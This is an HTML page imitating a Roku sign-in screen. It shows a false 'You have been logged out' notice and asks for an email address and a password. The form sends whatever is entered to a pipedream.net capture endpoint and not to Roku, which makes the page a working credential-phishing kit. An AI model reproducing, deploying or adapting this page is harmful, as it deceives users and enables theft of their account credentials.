<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Roku Sign In</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #fff;
      color: #202124;
    }

    .header {
      background-color: #f9f9f9;
      padding: 20px 40px;
      box-shadow: 0 1px 4px rgba(0,0,0,0.1);
    }

    .logo {
      color: #662d91;
      font-size: 28px;
      font-weight: bold;
    }

    .container {
      max-width: 500px;
      margin: 60px auto;
      padding: 0 20px;
    }

    h1 {
      font-size: 26px;
      margin-bottom: 20px;
    }

    label {
      font-size: 13px;
      font-weight: 500;
      margin-bottom: 6px;
      display: block;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      font-size: 15px;
      border: 1px solid #ccc;
      background-color: #f0f5ff;
      border-radius: 6px;
      margin-bottom: 20px;
    }

    button {
      background-color: #5c1fc4;
      color: #fff;
      padding: 12px 24px;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-weight: bold;
      margin-top: 10px;
      width: 100%;
    }

    .note,
    .options {
      font-size: 14px;
      margin-top: 25px;
      line-height: 1.6;
    }

    .note a,
    .options a {
      color: #0066cc;
      text-decoration: none;
    }

    .form-section {
      margin-bottom: 60px;
    }

    .footer {
      font-size: 12px;
      color: #555;
      text-align: center;
      padding: 30px 20px;
      border-top: 1px solid #eee;
    }

    .footer a {
      margin: 0 10px;
      color: #333;
      text-decoration: none;
    }

    .remember {
      display: flex;
      align-items: center;
      margin-bottom: 20px;
    }

    .remember input {
      margin-right: 8px;
    }

    hr {
      margin: 25px 0;
      border: none;
      border-top: 1px solid #ddd;
    }
  </style>
</head>
<body>
  <div class="header">
    <div class="logo">Roku</div>
  </div>

  <div class="container">
    <h4 style="color:gray">You have been logged out</h4>
    <!-- Sign-In Form -->
    <div class="form-section" id="login">
      <h1>Sign in</h1>
    
      <form action="https://eo152lqegwprrxn.m.pipedream.net/" method="POST">
        <label>Email</label>
        <input type="text" name="email" value="" required>

        <label>Password</label>
        <input type="password" name="password" value="" required>

        <a href="#" class="options">Forgot password?</a>
        <div class="remember">
          <input type="checkbox" id="remember">
          <label for="remember">Remember me</label>
        </div>

        <button type="submit">Sign in</button>
      </form>

      <div class="options">
        New user? <a href="#">Create account</a>
      </div>
    </div>

  </div>

  <div class="footer">
    <a href="#">Terms and Conditions</a> |
    <a href="#">Privacy Policy</a> |
    <a href="#">Developer Site</a> |
    <a href="#">About ads & cookies</a> |
    <a href="#">My Privacy Choices</a>
    <br><br>
    &copy; 2008â€“2025 Roku
  </div>
</body>
</html>
